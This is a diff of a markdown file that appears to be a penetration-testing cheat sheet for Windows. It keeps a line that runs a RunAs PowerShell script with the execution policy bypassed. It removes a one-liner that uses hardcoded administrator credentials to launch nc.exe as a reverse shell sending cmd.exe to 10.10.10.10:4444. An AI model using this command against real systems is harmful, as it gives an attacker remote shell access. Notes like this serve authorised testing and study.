@@ -510,10 +510,6 @@ Next run this script using powershell.exe:
 ```cmd
 CMD C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
-Or run it as a handy one-liner from the Windows command line:
-```cmd
-CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command '$username = "Admin"; $password = "PASSWORD";  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Users\Public\Downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("10.10.10.10", "4444", "-e", "cmd.exe") -WorkingDirectory C:\Users\Public\Downloads;'
-```
 
 # Other files
 Here are few other handy scripts and things...
